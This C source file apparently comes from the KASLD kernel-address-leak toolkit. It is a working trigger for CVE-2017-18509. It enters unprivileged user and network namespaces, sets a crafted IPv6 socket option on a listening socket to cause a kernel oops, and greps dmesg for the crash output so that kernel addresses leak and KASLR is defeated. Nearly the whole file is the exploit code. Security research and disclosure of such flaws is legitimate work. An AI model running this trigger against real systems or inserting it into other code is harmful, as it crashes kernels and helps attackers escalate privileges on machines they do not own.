// This file is part of KASLD - https://github.com/bcoles/kasld
// Trigger kernel oops inet_csk_listen_stop GPF (CVE-2017-18509) and search syslog for splat
// - https://lists.openwall.net/netdev/2017/12/04/40
// Requires:
// - kernel.unprivileged_userns_clone = 1; (Default on Ubuntu systems)
// - kernel.dmesg_restrict = 0 (Default on Ubuntu systems); or CAP_SYSLOG capabilities.
// Based on trigger PoC code by Denis Andzakovic:
// - https://pulsesecurity.co.nz/advisories/linux-kernel-4.9-inetcsklistenstop-gpf

#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <linux/sched.h>
#include <netinet/in.h>

int trigger_oops() {
  if (unshare(CLONE_NEWUSER) != 0) {
    printf("[-] unshare(CLONE_NEWUSER): %m\n");
    return 1;
  }
  if (unshare(CLONE_NEWNET) != 0) {
    printf("[-] unshare(CLONE_NEWNET): %m\n");
    return 1;
  }

  uint32_t opt = 99999999;
  int sock = socket(AF_INET6, SOCK_STREAM, 0);

  listen(sock, 0);
  setsockopt(sock, IPPROTO_IPV6, 0xd1, &opt, 4);
  close(sock);
  return 0;
}

int main (int argc, char **argv) {
  printf("[.] trying inet_csk_listen_stop GPF ...\n");

  if (system("grep -s -q 1 /proc/sys/kernel/panic_on_oops") == 0) {
    printf("kernel.panic_on_oops = 1. Aborted.\n");
    return 1;
  }

  pid_t rv;

  rv = fork();
  if (rv == -1) {
    printf("[-] fork(): %m\n");
    return 0;
  }

  if (rv == 0) {
    trigger_oops();
    return 0;
  }

  printf("[.] searching dmesg for inet_csk_listen_stop ...\n");

  if (system("dmesg | grep inet_csk_listen_stop") != 0) {
    printf("[-] inet_csk_listen_stop not found in dmesg\n");
    return 1;
  }

  return 0;
}

